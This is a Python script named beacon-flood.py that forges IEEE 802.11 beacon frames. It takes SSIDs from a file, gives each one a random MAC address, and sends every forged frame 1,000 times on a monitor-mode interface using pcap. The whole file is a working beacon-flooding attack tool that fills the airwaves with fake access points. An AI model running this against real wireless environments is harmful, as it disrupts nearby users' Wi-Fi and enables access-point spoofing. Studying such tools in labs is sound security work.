import beacon as B
import radiotap as R
from functions import *
#from scapy.all import *
import os
import pcap
import sys


#########################
####### argv check ######
#########################

if len(sys.argv) != 3:
    print("python beacon-flood.py <interface> <ssid-list-file>")
    exit()

#########################
####### open file #######
#########################

filename = sys.argv[2]
f = open(filename, 'r')
ssids = f.readlines()
f.close()


#########################
####### build packet ####
#########################

####### radiotap ########
version = 0
pad = 0
length = 8
present = 0

radiotap = R.Radiotap(version, pad, length, present)

####### beacon ##########
frame_control = 0x0080
duration_id = 0
DA = itobl(0xffffffffffff, 6)
#SA = itobl(0x111111111111, 6)
#BSS_ID = itobl(0x111111111111, 6)
sequence_control = 0x6720

####### wireless ########
timestamp = 0x000004e6d3811190
beacon_interval = 0x0064
capability_information = 0x0411

#ssid = itobb(0x0006555555555555, 8)
supported_rates = itobb(0x010882848b960c121824, 10)
ds_parameter_set = itobb(0x030101, 3)


#########################
####### make packet #####
#########################

i_name = sys.argv[1]
sniffer = pcap.pcap(name=i_name, promisc=True, immediate=True, timeout_ms=50)

for ssid_string in ssids:
    ssid_string = ssid_string.strip() # strip \n
    print('ssid is', ssid_string)
    
    random_mac = make_random_mac()
    print('mac address is ', ':'.join('%02X' % m for m in random_mac))
    dot11B = B.Dot11Beacon(frame_control, duration_id, DA, random_mac, random_mac, sequence_control)

    ssid = make_ssid_bytes(ssid_string)
    tags = ssid + supported_rates + ds_parameter_set
    dot11W = B.Dot11WirelessManagement(timestamp, beacon_interval, capability_information, tags)
    beacon = B.Beacon(dot11B, dot11W)

    buf = radiotap.ctob() + beacon.ctob()
    #hexdump(buf)

    for _ in range(1000):
        sniffer.sendpacket(buf)

    



# channel = 1
# i_name = 'mon0'
# while True:
#     channel = (channel + 5) % 13 + 1
#     os.system('iwconfig '+i_name+' channel '+str(channel))
#     print('channel is', str(channel))
#     sniffer = pcap.pcap(name='mon0', promisc=True, immediate=True, timeout_ms=50)
#     print('sending')
#     for i in range(1000):
        
#         sniffer.sendpacket(buf)
#     print('sended')